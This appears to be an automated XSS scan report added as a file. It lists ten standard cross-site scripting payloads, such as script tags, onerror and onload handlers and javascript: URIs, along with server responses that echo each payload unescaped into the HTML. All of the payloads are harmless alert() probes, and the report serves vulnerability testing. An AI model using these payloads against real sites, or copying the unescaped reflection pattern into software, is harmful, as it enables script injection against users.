@@ -1,0 +1,118 @@
+XSS Vulnerability Testing Report
+========================================
+Testing Date: 2024-12-06 14:14:14
+Total Tests Conducted: 10
+Total Vulnerabilities Found: 10
+
+Detailed Vulnerability Information:
+----------------------------------------
+Payload: <script>alert('XSS')</script>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p><script>alert('XSS')</script></p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: <img src=x onerror=alert('XSS')>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p><img src=x onerror=alert('XSS')></p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: <svg/onload=alert('XSS')>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p><svg/onload=alert('XSS')></p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: <iframe src='javascript:alert(`XSS`);'></iframe>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p><iframe src='javascript:alert(`XSS`);'></iframe></p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: javascript:alert('XSS')
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p>javascript:alert('XSS')</p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: <body onload=alert('XSS')>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p><body onload=alert('XSS')></p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: '"><script>alert('XSS')</script>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p>'"><script>alert('XSS')</script></p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: ><script>alert(1)</script>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p>><script>alert(1)</script></p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: <marquee onstart=alert('XSS')>XSS</marquee>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p><marquee onstart=alert('XSS')>XSS</marquee></p>
+        </body>
+    </html>
+    
+----------------------------------------
+Payload: <a href='javascript:alert(1)'>Click</a>
+Status Code: 200
+Response Snippet: 
+    <html>
+        <body>
+            <h1>Ваш ввод:</h1>
+            <p><a href='javascript:alert(1)'>Click</a></p>
+        </body>
+    </html>
+    
+----------------------------------------
